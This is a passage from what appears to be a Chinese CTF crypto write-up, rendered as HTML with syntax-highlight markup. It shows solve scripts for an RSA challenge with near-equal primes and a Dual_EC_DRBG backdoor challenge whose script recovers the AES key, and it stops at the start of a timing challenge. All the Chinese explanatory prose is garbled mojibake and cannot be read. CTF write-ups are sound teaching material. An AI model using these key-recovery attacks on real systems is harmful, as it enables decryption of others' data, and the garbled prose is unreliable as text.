class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">b&#x27;flag&#x27;</span>.<span class="built_in">hex</span>(),<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">4</span>*<span class="number">8</span>)))</span><br><span class="line">flag = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">tmp = C[<span class="number">0</span>] - (f0*(PPt^<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    l = <span class="built_in">list</span>((C[k]-tmp)*PPt^(-<span class="number">6</span>))</span><br><span class="line">    flag += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> l]),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;P_has_no_Semantic_Security&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ä¸­å­¦æ•°å­¦"><a href="#ä¸­å­¦æ•°å­¦" class="headerlink" title="ä¸­å­¦æ•°å­¦"></a>ä¸­å­¦æ•°å­¦</h3><blockquote><p>æœ¬é¢˜flagæ ¼å¼: flag{xxx}</p><p>Zuni: å¬è¯´å¯†ç å­¦æ˜¯å°å­¦æ•°å­¦æ¥ç€ï¼Ÿ</p><p>// éšç¼˜è¯„ï¼šçœŸçš„å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">q=next_prime(p+(p&gt;&gt;<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c= 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ æ¥è¿‘ï¼Œä¸”å‰1024-500ä½ç›¸åŒï¼Œæœ‰ $\sqrt{n}&gt;&gt;500 \approx p&gt;&gt;500 \approx q-p$ï¼Œæ•…å¯çˆ†ç ´æ‰¾å·®å€¼ $k$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">f1, f2</span>):</span><br><span class="line">g = f1.resultant(f2, q)</span><br><span class="line">roots = g.univariate_polynomial().roots()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p_ = <span class="built_in">abs</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q_ = <span class="built_in">abs</span>(roots[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">min</span>(p_, q_), <span class="built_in">max</span>(p_, q_))</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">x = <span class="built_in">int</span>(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">xh = x &gt;&gt; <span class="number">500</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">1000000</span>,<span class="number">10000000</span>):</span><br><span class="line">    d = xh - k</span><br><span class="line">    P.&lt;p, q&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = n - p*q</span><br><span class="line">    f2 = d - (q - p)</span><br><span class="line">    res = solve(f1, f2)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 5476332</span></span><br><span class="line"><span class="comment"># (117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171074427891089886767667348073044876487630536209840494632852807000951512126317010773423294553929289375585831391437922887752426888245829185481732564145862194694837, 117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171110284932237912222026220958706260216927350725324469350893507592837055161338352274913301924684983498346654165295930055956026431077232360603315231271970883987911)</span></span><br></pre></td></tr></table></figure><p>å†å¸¸è§„è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;never_ignore_basic_math&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="bd-key"><a href="#bd-key" class="headerlink" title="bd_key"></a>bd_key</h3><blockquote><p>æœ¬é¢˜flagæ ¼å¼: NepCTF{xxx}</p><p>master of pwnä¸€ä¸‹å°±è§£å‡ºäº†æ˜æ–‡ï¼Œå› ä¸ºæœ‰åé—¨ï¼ˆæœ¬é¢˜ä¸pwnæ— å…³ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> Note: I have modified Dual_EC a little bit.</span></span><br><span class="line"><span class="string">    It would be EASIER for you to exploit it.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dual_EC</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, s_0=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># Init curve P-256</span></span><br><span class="line">        self.p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">        self.n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">        self.b = <span class="number">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></span><br><span class="line">        self.curve = EllipticCurve(GF(self.p), [-<span class="number">3</span>, self.b])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init P, Q</span></span><br><span class="line">        self.Qx = <span class="number">0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296</span></span><br><span class="line">        self.Qy = <span class="number">0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5</span></span><br><span class="line">        self.Q = self.curve(self.Qx, self.Qy)</span><br><span class="line">        self.d = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">        self.P = self.d * self.Q      </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init state, h_adin</span></span><br><span class="line">        <span class="keyword">if</span> s_0 == <span class="literal">None</span>:</span><br><span class="line">            self.s_i = <span class="built_in">int</span>(floor((<span class="number">2</span>^<span class="number">16</span>-<span class="number">1</span>)*random()))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.s_i = s_0</span><br><span class="line">        self.h_adin = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        self.__leak_par()</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__leak_par</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;curve = <span class="subst">&#123;self.curve&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;P = <span class="subst">&#123;self.P&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;self.d&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Q = <span class="subst">&#123;self.Q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Output 32bytes now.          </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__Dual_EC_DRBG</span>(<span class="params">self, h_adin = <span class="number">0</span></span>): </span><br><span class="line">        t_i = self.s_i ^^ h_adin</span><br><span class="line">        self.s_i = (t_i*self.P)[<span class="number">0</span>].lift()</span><br><span class="line">        r_i = (self.s_i*self.Q)[<span class="number">0</span>].lift()</span><br><span class="line">        <span class="keyword">return</span> r_i</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getRandomNBytes</span>(<span class="params">self, N:<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        req = (N/<span class="number">32</span>).ceil()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(req):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG(self.h_adin)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG()</span><br><span class="line"></span><br><span class="line">        self.s_i = (self.s_i * self.P)[<span class="number">0</span>].lift()</span><br><span class="line"></span><br><span class="line">        result = result &gt;&gt; ((<span class="number">32</span>*req - N)*<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(result)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_flag</span>(<span class="params">key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line">    <span class="keyword">from</span> FLAG3 <span class="keyword">import</span> flag</span><br><span class="line">    </span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag_pad = pad(flag, <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(flag_pad)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_schnorr_identification</span>(<span class="params">dbrg</span>):</span><br><span class="line">    p = getPrime(<span class="number">256</span>)</span><br><span class="line">    Zp = Zmod(p)</span><br><span class="line">    g = Zp(<span class="number">2</span>)</span><br><span class="line">    q = g.multiplicative_order()</span><br><span class="line">    Zq = Zmod(q)</span><br><span class="line">    k = <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SchnorrProver</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">            self.secret_key = Zq.random_element()</span><br><span class="line">            self.public_key = g^self.secret_key</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">commit</span>(<span class="params">self</span>):</span><br><span class="line">            self.r = Zq.random_element()</span><br><span class="line">            <span class="keyword">return</span> g^self.r</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">respond</span>(<span class="params">self, challenge</span>):</span><br><span class="line">            <span class="keyword">return</span> self.r - challenge*self.secret_key</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SchnorrVerifier</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, prover_public_key</span>):</span><br><span class="line">            self.prover_public_key = prover_public_key</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">self, commitment</span>):</span><br><span class="line">            self.commitment = commitment</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                c = bytes_to_long(dbrg.getRandomNBytes(<span class="number">32</span>))</span><br><span class="line">                <span class="keyword">if</span> c &lt; p:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.challenge_number = c</span><br><span class="line">            <span class="keyword">return</span> self.challenge_number</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, response</span>):</span><br><span class="line">            check_value = g^response*self.prover_public_key^self.challenge_number</span><br><span class="line">            <span class="keyword">return</span> self.commitment == check_value</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_protocol</span>(<span class="params">iterations=<span class="number">1</span></span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(iterations):</span><br><span class="line">            prover = SchnorrProver()</span><br><span class="line">            verifier = SchnorrVerifier(prover.public_key)</span><br><span class="line">            t = prover.commit()</span><br><span class="line">            c = verifier.challenge(t)</span><br><span class="line">            s = prover.respond(c)</span><br><span class="line">            <span class="keyword">assert</span>(verifier.check(s))</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    run_protocol()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    dbrg = Dual_EC()</span><br><span class="line">    do_schnorr_identification(dbrg)</span><br><span class="line">    key = dbrg.getRandomNBytes(<span class="number">16</span>)</span><br><span class="line">    ct = encrypt_flag(key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ct = <span class="subst">&#123;bytes_to_long(ct)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># curve = Elliptic Curve defined by y^2 = x^3 + 115792089210356248762697446949407573530086143415290314195533631308867097853948*x + 41058363725152142129326129780047268409114441015993725554835256314039467401291 over Finite Field of size 115792089210356248762697446949407573530086143415290314195533631308867097853951</span><br><span class="line"># P = (72696788778535848020209987825324097844942627382508830211685965810687985426258 : 49180397040468497821240854375656422791216946832858522054245540263375986110762 : 1)</span><br><span class="line"># d = 66604141534275704476445937214374130642068729921454877238730830814793201802544</span><br><span class="line"># Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286 : 36134250956749795798585127919587881956611106672985015071877198253568414405109 : 1)</span><br><span class="line"># c = 59100197418944667413449341413044666843726352095054393072750502893110293231642</span><br><span class="line"># ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span><br></pre></td></tr></table></figure></blockquote><p>åŒæ¤­åœ†æ›²çº¿ç¡®å®šæ€§éšæœºæ•°å‘ç”Ÿå™¨ï¼ˆDual_EC_DRBGï¼‰çš„ä¸€ä¸ªåé—¨ï¼ŒåŸç†ï¼š</p><p>è®¾æ¯ä¸€æ­¥çš„ $\text{state}$ ä¸º $s_i$ï¼Œéšæœºæ•°ä¸º $r_i$ï¼Œéšæœºæ•°å¯¹åº”çš„æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ä¸º $R_i$ã€‚</p><p>å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œå·²çŸ¥ $P$ã€$Q$ã€$d$ã€$r_{i-1}$ï¼Œè€Œ $s_i$ æœªçŸ¥ã€‚äºæ˜¯æœ‰ï¼š</p><p>$\begin{cases} ((s_i \cdot P)_x \cdot P)_x &amp; \rightarrow s_{i+1} \newline ((s_i \cdot P)_x \cdot Q)_x &amp; \rightarrow r_i \end{cases}$</p><p>åé—¨ä¸ºæ„é€  $d \cdot r_{i-1}$ï¼Œå…¶æ°å¥½æ˜¯ $s_i$ï¼Œçœ‹ä¼¼å®‰å…¨çš„ä½“åˆ¶è¢«æ”»ç ´ã€‚</p><p>è®° $k_i = (s_i \cdot P)_x$ï¼Œæœ‰ï¼š</p><p>$\begin{align} d \cdot r_{i-1} &amp; = {(d \cdot R_{i-1})_x = (d \cdot k_{i-1} \cdot Q)_x} = {(k_{i-1} \cdot d \cdot Q)_x = (k_{i-1} \cdot P)_x} = {((s_{i-1} \cdot P)_x \cdot P)_x = s_i} \end{align}$</p><p>é¢˜é‡Œ $c=r_{i-1}$ï¼Œæ„é€  $d \cdot c = s_i$ï¼Œåˆ™å¯ä»¥æ¨å‡ºä¸‹ä¸€ä¸ªéšæœºæ•° $r_i=((s_i \cdot P)_x \cdot Q)_x$ï¼Œå–é«˜16*8ä½ä¸ºAESçš„Keyã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">a = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853948</span></span><br><span class="line">b = <span class="number">41058363725152142129326129780047268409114441015993725554835256314039467401291</span></span><br><span class="line">p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">P = (<span class="number">72696788778535848020209987825324097844942627382508830211685965810687985426258</span>, <span class="number">49180397040468497821240854375656422791216946832858522054245540263375986110762</span>)</span><br><span class="line">d = <span class="number">66604141534275704476445937214374130642068729921454877238730830814793201802544</span></span><br><span class="line">Q = (<span class="number">48439561293906451759052585252797914202762949526041747995844080717082404635286</span>, <span class="number">36134250956749795798585127919587881956611106672985015071877198253568414405109</span>)</span><br><span class="line">c = <span class="number">59100197418944667413449341413044666843726352095054393072750502893110293231642</span></span><br><span class="line">ct = <span class="number">25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span></span><br><span class="line"></span><br><span class="line">P = E(P)</span><br><span class="line">Q = E(Q)</span><br><span class="line">R0 = E.lift_x(c)</span><br><span class="line">s1 = (d*R0)[<span class="number">0</span>]</span><br><span class="line">s2 = ((s1*P)[<span class="number">0</span>]*P)[<span class="number">0</span>]</span><br><span class="line">r1 = ((s1*P)[<span class="number">0</span>]*Q)[<span class="number">0</span>]</span><br><span class="line">key = r1 &gt;&gt; ((<span class="number">32</span> - <span class="number">16</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line">ct = long_to_bytes(ct)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(ct))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;NS4_b4ckd00r_1n_ps3ud0_r4nd0m_g3n3r4t0r&#125;\x01&#x27; </span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="timing"><a href="#timing" class="headerlink" title="timing"></a>timing</h3><blockquote><p>ç‰¢ä¸å¯ç ´çš„ç®—æ³•ï¼Œæˆ–è®¸ä¼šåœ¨å…¶ä»–åœ°æ–¹å‡ºç°é—®é¢˜ï¼Ÿ<br>(å®¹å™¨ä¸‹å‘åï¼Œå¸ˆå‚…è‡ªè¡Œncå“¦ï½ï½ï½)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 